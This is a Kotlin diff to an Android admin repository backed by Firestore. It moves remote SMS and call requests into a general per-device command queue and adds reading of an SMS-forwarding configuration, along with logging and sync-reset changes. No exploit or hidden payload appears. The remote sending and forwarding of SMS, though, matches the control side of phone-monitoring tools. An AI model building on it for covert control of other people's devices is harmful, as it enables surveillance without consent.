@@ -140,43 +140,41 @@ class AdminRepositoryImpl @Inject constructor(
         }
     }
 
-    override suspend fun requestSms(deviceId: String, number: String, message: String, simSlot: Int) {
-        try {
-            db.collection("devices")
+    override suspend fun sendCommand(deviceId: String, command: Command): String {
+        return try {
+            val docRef = db.collection("devices")
                 .document(deviceId)
-                .set(
-                    mapOf(
-                        "smsRequestedAt" to System.currentTimeMillis(),
-                        "smsRequestNumber" to number,
-                        "smsRequestMessage" to message,
-                        "smsRequestSimSlot" to simSlot
-                    ),
-                    SetOptions.merge()
-                )
-                .await()
+                .collection("commands")
+                .document()
+
+            val finalCommand = command.copy(id = docRef.id, createdAt = System.currentTimeMillis())
+            docRef.set(finalCommand).await()
+            Log.d("AdminRepositoryImpl", "ADMIN_COMMAND_CREATED: ${command.type}")
+            docRef.id
         } catch (e: Exception) {
-            Log.e("AdminRepositoryImpl", "Error requesting SMS", e)
+            Log.e("AdminRepositoryImpl", "Error sending command", e)
             throw e
         }
     }
 
-    override suspend fun requestCall(deviceId: String, number: String, simSlot: Int) {
-        try {
-            db.collection("devices")
-                .document(deviceId)
-                .set(
-                    mapOf(
-                        "callRequestedAt" to System.currentTimeMillis(),
-                        "callRequestNumber" to number,
-                        "callRequestSimSlot" to simSlot
-                    ),
-                    SetOptions.merge()
-                )
-                .await()
-        } catch (e: Exception) {
-            Log.e("AdminRepositoryImpl", "Error requesting Call", e)
-            throw e
-        }
+    override fun getCommand(deviceId: String, commandId: String): Flow<Command?> {
+        return db.collection("devices")
+            .document(deviceId)
+            .collection("commands")
+            .document(commandId)
+            .snapshots()
+            .map { it.toObject(Command::class.java) }
+            .catch { emit(null) }
+    }
+
+    override fun getSmsForwardingConfig(deviceId: String): Flow<SmsForwardingConfig?> {
+        return db.collection("devices")
+            .document(deviceId)
+            .collection("settings")
+            .document("smsForwarding")
+            .snapshots()
+            .map { it.toObject(SmsForwardingConfig::class.java) }
+            .catch { emit(null) }
     }
 
     override suspend fun deleteItem(deviceId: String, collection: String, itemId: String) {
@@ -210,6 +208,7 @@ class AdminRepositoryImpl @Inject constructor(
                 }
                 batch.commit().await()
             }
+            Log.d("AdminRepositoryImpl", "ADMIN_DELETE_ALL_COMPLETED: $collection")
 
             // After deleting all items, request a full sync and reset count
             val now = System.currentTimeMillis()
@@ -224,7 +223,8 @@ class AdminRepositoryImpl @Inject constructor(
             val updates = mutableMapOf<String, Any>(
                 "forceFullSyncRequestedAt" to now,
                 "syncRequestedAt" to now,
-                "syncStatus" to "Full Sync Requested"
+                "syncStatus" to "Full Sync Requested",
+                "lastError" to ""
             )
             countField?.let { updates[it] = 0 }
 
@@ -232,6 +232,7 @@ class AdminRepositoryImpl @Inject constructor(
                 .document(deviceId)
                 .set(updates, SetOptions.merge())
                 .await()
+            Log.d("AdminRepositoryImpl", "ADMIN_FORCE_FULL_SYNC_REQUESTED")
 
         } catch (e: Exception) {
             Log.e("AdminRepositoryImpl", "Error deleting all items from $collection", e)
